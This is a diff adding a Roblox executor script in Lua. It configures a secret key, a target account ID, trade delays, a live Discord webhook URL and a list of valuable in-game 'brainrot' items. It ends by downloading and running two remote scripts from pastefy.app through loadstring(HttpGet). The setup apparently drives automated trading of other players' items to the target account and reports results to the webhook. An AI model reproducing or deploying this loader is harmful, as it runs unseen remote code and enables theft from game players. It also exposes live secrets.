@@ -1,0 +1,71 @@
+getgenv().SECRET_KEY = "mrr_c149c1dd5bf045aaa5b8deeae62b173a"
+getgenv().TARGET_ID = 4433020161
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1486820882788909217/_QRfImA1jNfLe5Fv5A9XcAF5J5wDDl2p4tlpGCt1O7RXPGhzXABYa1PGfyJI3beEqN4X"
+getgenv().TARGET_BRAINROTS = {
+    ["Dragon Cannelloni"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Meowl"] = true,
+    ["Ginger Gerat"] = true,
+    ["Garama and Madundung"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Food Combinasion"] = true,
+    ["Los Amigos"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Sammyni Fattini"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["Orcaledon"] = true,
+    ["Eviledon"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Los Planitos"] = true,
+    ["Las Sis"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Headless Horseman"] = true,
+    ["Dragon Gingerini"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Cooki and Milki"] = true,
+    ["Ketupat Bros"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Los Sekolahs"] = true,
+    ["La Casa Boo"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Love Love Bear"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Tacoritas"] = true,
+    ["Los Primos"] = true,
+    ["Los Puggies"] = true,
+    ["Tralaledon"] = true,
+    ["Los Bros"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Swag Soda"] = true,
+    ["Cerberus"] = true,
+    ["Capitano Moby"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Tictac Sahur"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Money Money Puggy"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Chipso and Queso"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["Quesadillo Vampiro"] = true,
+    ["Griffin"] = true,
+    ["Nacho Spyder"] = true,
+    ["Swaggy Bros"] = true
+}
+task.spawn(function()
+loadstring(game:HttpGet("https://pastefy.app/hs1tdLZf/raw"))()
+end)
+task.spawn(function()
+task.wait(5)
+loadstring(game:HttpGet("https://pastefy.app/qu8SVbRc/raw"))()
+end)
